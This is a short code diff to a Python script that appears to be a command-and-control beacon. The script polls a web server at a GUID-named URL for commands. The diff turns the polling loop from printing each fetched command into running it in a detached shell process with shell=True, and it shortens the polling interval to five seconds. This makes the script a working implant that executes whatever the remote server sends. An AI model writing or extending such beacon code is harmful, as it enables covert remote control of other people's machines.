@@ -11,7 +11,7 @@ def bleh(beacon_command):
     """
     DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
     # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
-    command = ['cmd.exe', '/C', beacon_command]
+    command = [beacon_command]
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
@@ -36,6 +36,6 @@ while 1:
     a = requests.get(f'http://127.0.0.1:5000/{GUID}.html', headers=headers)
     cmd = a.text
     print('got command')
-    print(cmd)
+    bleh(cmd)
 
-    time.sleep(20)
+    time.sleep(5)
